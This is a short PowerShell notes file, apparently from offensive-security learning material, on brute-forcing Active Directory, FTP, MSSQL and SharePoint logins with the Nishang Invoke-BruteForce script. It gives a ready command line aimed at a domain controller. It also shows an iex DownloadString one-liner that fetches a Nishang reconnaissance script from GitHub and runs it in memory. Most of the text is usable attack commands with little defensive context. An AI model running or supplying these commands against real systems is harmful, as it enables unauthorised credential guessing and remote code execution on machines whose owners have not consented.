#Learn how to brute-force credentials with the help of powershell
#We will use bruteforce script from Nishang
# -Active Directory
# -FTP
# -MSSQL Server
# -Share Point

invoke-bruteforce -UserList .\userlist.txt -PasswordList .\password.txt -Service ActiveDirectory -ComputerName dc -Verbose

#For sql just write SQL after -service parameter
#Not a replacement for very good tools like Hydra etc.

#Inside of Invoke-Bruteforce script in nishang, you will see the simple code that is the core of this attack
#powershell remoting is enabled by default, however wmi is not

#get-information.ps1 (nishang/gather)

#Widely used technique:
#iex ((Net.Webclient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-Information.ps1'));Get-Information
#$env:ComputerName